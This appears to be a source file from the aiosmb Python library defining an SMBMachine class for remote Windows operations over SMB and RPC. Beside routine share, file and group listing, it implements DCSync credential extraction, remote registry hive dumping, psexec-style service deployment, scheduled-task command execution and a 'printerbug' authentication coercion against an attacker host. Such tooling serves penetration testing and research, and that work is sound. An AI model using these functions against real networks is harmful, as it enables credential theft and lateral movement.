
import asyncio
import ntpath
import os

from aiosmb import logger
from aiosmb.commons.interfaces.share import SMBShare
from aiosmb.commons.interfaces.session import SMBUserSession
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.commons.interfaces.directory import SMBDirectory
from aiosmb.dcerpc.v5.interfaces.srvsmgr import SMBSRVS
from aiosmb.dcerpc.v5.interfaces.samrmgr import SMBSAMR
from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSAD
from aiosmb.dcerpc.v5.interfaces.drsuapimgr import SMBDRSUAPI
from aiosmb.dcerpc.v5.interfaces.servicemanager import SMBRemoteServieManager
from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRP
from aiosmb.dcerpc.v5.interfaces.rprnmgr import SMBRPRN
from aiosmb.dcerpc.v5.interfaces.tschmgr import SMBTSCH

from aiosmb.dcerpc.v5 import tsch

from aiosmb.commons.utils.decorators import red, rr, red_gen, rr_gen
from aiosmb.commons.exceptions import SMBMachineException

from aiosmb.commons.interfaces.blocking.file.file import SMBBlockingFileMgr
from aiosmb.commons.interfaces.blocking.file.blockingfile import SMBBlockingFile
from aiosmb.commons.utils.apq import AsyncProcessQueue
from aiosmb.protocol.smb2.commands.ioctl import CtlCode, IOCTLREQFlags

from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB

def req_srvs_gen(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'SRVS' in this.privtable:
				if this.privtable['SRVS'] == False:
					raise SMBMachineException('SRVS failed to open. Probably permission issues.')
			if this.srvs is None:
				await rr(this.connect_rpc('SRVS'))
			async for x in  funct(*args, **kwargs):
				if x[-1] is not None:
					raise x[-1]
				yield x
		except Exception as e:
			raise e
	return wrapper

def req_rrp(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'RRP' in this.privtable:
				if this.privtable['RRP'] == False:
					raise SMBMachineException('RRP failed to open. Probably permission issues.')
			if this.rrp is None:
				await rr(this.connect_rpc('RRP'))
			x = await funct(*args, **kwargs)
			return x
		except Exception as e:
			raise e
	return wrapper

def req_samr_gen(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'SAMR' in this.privtable:
				if this.privtable['SAMR'] == False:
					raise SMBMachineException('SAMR failed to open. Probably permission issues.')
			if this.samr is None:
				await rr(this.connect_rpc('SAMR'))
			async for x in funct(*args, **kwargs):
				if x[-1] is not None:
					raise x[-1]
				yield x
		except Exception as e:
			raise e
	return wrapper

def req_lsad_gen(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'LSAD' in this.privtable:
				if this.privtable['LSAD'] == False:
					raise SMBMachineException('LSAD failed to open. Probably permission issues.')
			if this.lsad is None:
				await rr(this.connect_rpc('LSAD'))
			async for x in  funct(*args, **kwargs):
				if x[-1] is not None:
					raise x[-1]
				yield x
		except Exception as e:
			raise e
	return wrapper

def req_servicemanager_gen(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'SERVICEMGR' in this.privtable:
				if this.privtable['SERVICEMGR'] == False:
					raise SMBMachineException('SERVICEMGR failed to open. Probably permission issues.')
			if this.servicemanager is None:
				await rr(this.connect_servicemanager())
			async for x in funct(*args, **kwargs):
				if x[-1] is not None:
					raise x[-1]
				yield x
		except Exception as e:
			raise e
	return wrapper

def req_servicemanager(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'SERVICEMGR' in this.privtable:
				if this.privtable['SERVICEMGR'] == False:
					raise SMBMachineException('SERVICEMGR failed to open. Probably permission issues.')
			if this.servicemanager is None:
				await rr(this.connect_servicemanager())
			x = await funct(*args, **kwargs)
			return x
		except Exception as e:
			raise e
	return wrapper

def req_tsch(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'TSCH' in this.privtable:
				if this.privtable['TSCH'] == False:
					raise SMBMachineException('TSCH failed to open. Probably permission issues.')
			if this.tsch is None:
				await rr(this.connect_rpc('TSCH'))
			x = await funct(*args, **kwargs)
			return x
		except Exception as e:
			raise e
	return wrapper

def req_rprn(funct):
	async def wrapper(*args, **kwargs):
		this = args[0]
		try:
			if 'RPRN' in this.privtable:
				if this.privtable['RPRN'] == False:
					raise SMBMachineException('RPRN failed to open. Probably permission issues.')
			if this.rprn is None:
				await rr(this.connect_rpc('RPRN'))
			x = await funct(*args, **kwargs)
			return x
		except Exception as e:
			raise e
	return wrapper

class SMBMachine:
	def __init__(self, connection):
		self.connection = connection
		self.services = []
		self.shares = []
		self.localgroups = []
		self.sessions = []
		self.domains = []

		self.srvs = None
		self.samr = None
		self.lsad = None
		self.rrp = None
		self.rprn = None
		self.tsch = None

		self.filesystem = None
		self.servicemanager = None

		self.privtable = {}
		self.blocking_mgr_tasks = {}


	async def __aenter__(self):
		return self
		
	async def __aexit__(self, exc_type, exc, traceback):
		try:
			await asyncio.wait_for(self.close(), timeout = 5)
		except:
			pass

	async def close(self):
		# TODO: make it prettier!
		if self.srvs is not None:
			await self.srvs.close()
		if self.samr is not None:
			await self.samr.close()
		if self.lsad is not None:
			await self.lsad.close()
		if self.rrp is not None:
			await self.rrp.close()
		if self.rprn is not None:
			await self.rprn.close()
		if self.tsch is not None:
			await self.tsch.close()

	def get_blocking_file(self):
		"""
		Starts a file manager task and initializes the io queues
		"""

		in_q = AsyncProcessQueue()
		out_q = AsyncProcessQueue()
		fsm = SMBBlockingFileMgr(self.connection, in_q, out_q)
		fsmt = asyncio.create_task(fsm.run())
		self.blocking_mgr_tasks[fsmt] = 1
		bfile = SMBBlockingFile(in_q, out_q)
		return bfile

	@red
	async def connect_rpc(self, service_name):
		if service_name.upper() == 'SRVS':
			self.srvs = SMBSRVS(self.connection)
			self.privtable['SRVS'] = False
			await rr(self.srvs.connect())
			self.privtable['SRVS'] = True
		elif service_name.upper() == 'SAMR':
			self.samr = SMBSAMR(self.connection)
			self.privtable['SAMR'] = False
			await rr(self.samr.connect())
			self.privtable['SAMR'] = True
		elif service_name.upper() == 'LSAD':
			self.lsad = LSAD(self.connection)
			self.privtable['LSAD'] = False
			await rr(self.lsad.connect())
			self.privtable['LSAD'] = True
		elif service_name.upper() == 'RRP':
			self.rrp = RRP(self.connection)
			self.privtable['RRP'] = False
			await rr(self.rrp.connect())
			self.privtable['RRP'] = True
		elif service_name.upper() == 'RPRN':
			self.rprn = SMBRPRN(self.connection)
			self.privtable['RPRN'] = False
			await rr(self.rprn.connect())
			self.privtable['RPRN'] = True
		elif service_name.upper() == 'TSCH':
			self.tsch = SMBTSCH(self.connection)
			self.privtable['TSCH'] = False
			await rr(self.tsch.connect())
			self.privtable['TSCH'] = True
		else:
			raise Exception('Unknown service name : %s' % service_name)
		return True, None
	
	@red
	async def connect_servicemanager(self):
		self.servicemanager = SMBRemoteServieManager(self.connection)
		self.privtable['SERVICEMGR'] = False
		await rr(self.servicemanager.connect())
		self.privtable['SERVICEMGR'] = True
		return True, None

	@req_srvs_gen
	async def list_shares(self):
		try:
			async for name, share_type, remark, err in self.srvs.list_shares():
				if err is not None:
					yield None, err
					return
				share = SMBShare(
					name = name, 
					stype = share_type, 
					remark = remark, 
					fullpath = '\\\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), name)
				)
				yield share, None
		except Exception as e:
			yield None, e

	@req_srvs_gen
	async def list_sessions(self, level = 10):
		async for username, ip_addr, err in self.srvs.list_sessions(level = level):
			if err is not None:
				yield None, err
				return
			sess = SMBUserSession(username = username, ip_addr = ip_addr.replace('\\','').strip())
			self.sessions.append(sess)
			yield sess, None

	@req_samr_gen
	async def list_domains(self):
		async for domain, err in self.samr.list_domains():
			#self.domains.append(domain)
			yield domain, err
	
	@req_samr_gen
	async def list_localgroups(self):
		async for name, sid, err in self.list_groups('Builtin'):
			yield name, sid, err

	@req_samr_gen
	async def list_groups(self, domain_name, ret_sid = True):
		"""
		Lists all groups in a given domain.
		domain_name: string
		"""
		domain_sid, _ = await rr(self.samr.get_domain_sid(domain_name))
		domain_handle, _ = await rr(self.samr.open_domain(domain_sid))
		#target_group_rids = {}
		async for name, rid, _ in rr_gen(self.samr.list_aliases(domain_handle)):
			sid = '%s-%s' % (domain_sid, rid)
			yield name, sid, None

	@req_samr_gen
	@req_lsad_gen
	async def list_group_members(self, domain_name, group_name):
		policy_handle, _ = await rr(self.lsad.open_policy2())
		domain_sid, _ = await rr(self.samr.get_domain_sid(domain_name))
		domain_handle, _ = await rr(self.samr.open_domain(domain_sid))
		target_group_rid = None
		async for name, rid, _ in rr_gen(self.samr.list_aliases(domain_handle)):
			if name == group_name:
				target_group_rid = rid
				break

		if target_group_rid is None:
			raise Exception('No group found with name "%s"' % group_name)
		
		alias_handle, _ = await rr(self.samr.open_alias(domain_handle, target_group_rid))
		async for sid, _ in rr_gen(self.samr.list_alias_members(alias_handle)):
			async for domain_name, user_name, _ in rr_gen(self.lsad.lookup_sids(policy_handle, [sid])):
				yield domain_name, user_name, sid, None


	async def list_directory(self, directory):
		_, err = await directory.list(self.connection)
		if err is not None:
			yield False, err
			return
		
		for entry in directory.get_console_output():
			yield entry

	async def enum_all_recursively(self, depth = 3, maxentries = None, exclude_share=['print$', 'PRINT$'], exclude_dir=[], fetch_dir_sd = False, fetch_file_sd = False):
		shares = {}
		async for share, err in self.list_shares():
			if err is not None:
				raise err
			if share.name.upper() == 'IPC$':
				continue
			shares[share.name] = share
			yield share, 'share', None

		for share_name in shares:
			if share_name in exclude_share:
				continue

			_, err = await shares[share_name].connect(self.connection)
			if err is not None:
				continue
				raise err

			async for entry in shares[share_name].subdirs[''].list_r(self.connection, depth = depth, maxentries = maxentries, fetch_dir_sd = fetch_dir_sd, fetch_file_sd = fetch_file_sd, exclude_dir = exclude_dir):
				yield entry
				await asyncio.sleep(0)

	async def put_file(self, local_path, remote_path):
		"""
		remote_path must be a full UNC path with the file name included!

		"""
		try:
			smbfile = SMBFile.from_remotepath(self.connection, remote_path)
			_, err = await smbfile.open(self.connection, 'w')
			if err is not None:
				return False, err

			with open(local_path, 'rb') as f:
				total_writen, err = await smbfile.write_buffer(f)

			await smbfile.close()
			return total_writen, None
		except Exception as e:
			return False, e

	async def get_file(self, out_path, file_obj):
		with open(out_path, 'wb') as f:
			try:
				await file_obj.open(self.connection, 'r')
				while True:
					data = await file_obj.read(1024)
					if not data:
						break
					f.write(data)
			finally:
				await file_obj.close()

	async def get_file_data(self, file_obj):
		_, err = await file_obj.open(self.connection, 'r')
		if err is not None:
			yield None, err
			return
		async for data, err in file_obj.read_chunked():
			yield data, err

	async def del_file(self, file_path):
		return await SMBFile.delete_rempath(self.connection, file_path)
	
	async def del_directory_path(self, dir_path):
		return await SMBDirectory.delete_unc(self.connection, dir_path)

	async def create_subdirectory(self, directory_name, parent_directory_obj):
		await parent_directory_obj.create_subdir(directory_name, self.connection)
		

	@req_servicemanager_gen
	async def list_services(self):
		async for service, _ in rr_gen(self.servicemanager.list()):
			yield service, None

	@req_servicemanager
	async def enable_service(self, service_name):
		res, exc = await self.servicemanager.enable_service(service_name)
		return res, exc

	#@red_gen
	@req_samr_gen
	async def list_domain_users(self, target_domain = None):
		if target_domain is None:
			logger.debug('No domain defined, fetching it from SAMR')
					
							
			logger.debug('Fetching domains...')
			async for domain, _ in rr_gen(self.samr.list_domains()):
				if domain == 'Builtin':
					continue
				if target_domain is None: #using th first available
					target_domain = domain
					logger.debug('Domain available: %s' % domain)

		domain_sid, _ = await self.samr.get_domain_sid(target_domain)
		domain_handle, _ = await self.samr.open_domain(domain_sid)
		
		async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
			yield username, user_sid, err

	async def dcsync(self, target_domain = None, target_users = []):
		try:
			if isinstance(target_users, str):
				target_users = [target_users]
			if self.samr is None:
				await self.connect_rpc('SAMR')

			if target_domain is None:
				logger.debug('No domain defined, fetching it from SAMR')
				
				logger.debug('Fetching domains...')
				async for domain, err in self.samr.list_domains():
					if err is not None:
						raise err
					if domain == 'Builtin':
						continue
					if target_domain is None: #using th first available
						target_domain = domain
						logger.debug('Domain available: %s' % domain)
			
			async with SMBDRSUAPI(self.connection, target_domain) as drsuapi:
				try:
					_, err = await drsuapi.connect()
					if err is not None:
						raise err
					_, err = await drsuapi.open()
					if err is not None:
						raise err
				except Exception as e:
					logger.exception('Failed to connect to DRSUAPI!')
					raise e

				logger.debug('Using domain: %s' % target_domain)
				if len(target_users) > 0:
					for username in target_users:
						secrets, err = await drsuapi.get_user_secrets(username)
						yield secrets, err
								
				else:
					
					domain_sid, _ = await self.samr.get_domain_sid(target_domain)
					domain_handle, _ = await self.samr.open_domain(domain_sid)
					async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
						if err is not None:
							yield None, err
							return
						logger.debug('username: %s' % username)
						secrets, err = await drsuapi.get_user_secrets(username)
						if err is not None:
							yield None, err
							return
						logger.debug('secrets: %s' % secrets)
						yield secrets, None

		except Exception as e:
			yield None, e
			return

	@req_rrp
	async def get_regapi(self):
		return self.rrp, None

	@req_rrp
	async def save_registry_hive(self, hive_name, remote_path):
		key_handle, err = await self.rrp.OpenRegPath(hive_name)
		if err is not None:
			return None, err
		res, err = await self.rrp.SaveKey(key_handle, remote_path)
		return res, err

	@req_servicemanager
	async def create_service(self, service_name, command, display_name = None):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		if display_name is None:
			display_name = service_name
		res, err = await self.servicemanager.create_service(service_name, display_name, command)
		return res, err

	@req_servicemanager
	async def start_service(self, service_name):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		return await self.servicemanager.start_service(service_name)
	
	@req_servicemanager
	async def stop_service(self, service_name):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		return await self.servicemanager.stop_service(service_name)


	@req_servicemanager
	async def deploy_service(self, path_to_executable, remote_path = None, service_name = None):
		"""

		remote path must be UNC
		"""
		if service_name is None:
			service_name = os.urandom(4).hex()
		if remote_path is None:
			raise NotImplementedError()

		filename = ntpath.basename(path_to_executable)
		remote_file_path = remote_path + filename
		remote_file = SMBFile.from_uncpath(remote_file_path)
		await self.put_file(path_to_executable, remote_file)
		
		command = remote_file_path

		await self.create_service(service_name, command)

		return True, None
	

	@req_tsch
	async def tasks_list(self):
		"""
		Lists scheduled tasks
		"""
		return self.tsch.list_tasks()

	@req_tsch
	async def tasks_register(self, template, task_name = None, flags = tsch.TASK_CREATE, sddl = None, logon_type = tsch.TASK_LOGON_NONE):
		"""
		Registers a new task
		"""
		return await self.tsch.register_task(template, task_name = task_name, flags = flags, sddl = sddl, logon_type = logon_type)

	@req_tsch
	async def tasks_execute_commands(self, commands):
		return await self.tsch.run_commands(commands)

	@req_tsch
	async def tasks_delete(self, task_name):
		return await self.tsch.delete_task(task_name)

	@req_rprn
	async def printerbug(self, attacker_host):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		print('opening printer')
		handle, _ = await rr(self.rprn.open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip()))
		print('got handle %s' % handle)
		resp, _ = await rr(self.rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
			handle,
			PRINTER_CHANGE_ADD_JOB,
			pszLocalMachine = '\\\\%s\x00' % attacker_host,

		))
		print('got resp! %s' % resp)
		return True, None

	async def list_interfaces(self):
		try:
			interfaces = []
			ipc_file = SMBFile.from_uncpath('\\\\%s\\IPC$' % self.connection.target.get_hostname_or_ip())
			await ipc_file.open(self.connection, 'r')
			ifaces_raw, err = await self.connection.ioctl(ipc_file.tree_id, b'\xFF'*16, CtlCode.FSCTL_QUERY_NETWORK_INTERFACE_INFO, data = None, flags = IOCTLREQFlags.IS_FSCTL)
			if err is not None:
				raise err

			for iface_raw in ifaces_raw:
				t = {
					'index' : iface_raw.IfIndex,
					'cap' : iface_raw.Capability,
					'speed' : iface_raw.LinkSpeed,
					'address' : str(iface_raw.SockAddr_Storage.Addr),
				}
				interfaces.append(t)
			
			return interfaces, None


		except Exception as e:
			return None, e

		finally:
			await ipc_file.close()
	
	@req_servicemanager
	async def check_service_status(self, service_name):
		return await self.servicemanager.check_service_status(service_name)


	async def list_mountpoints(self):
		pass
	
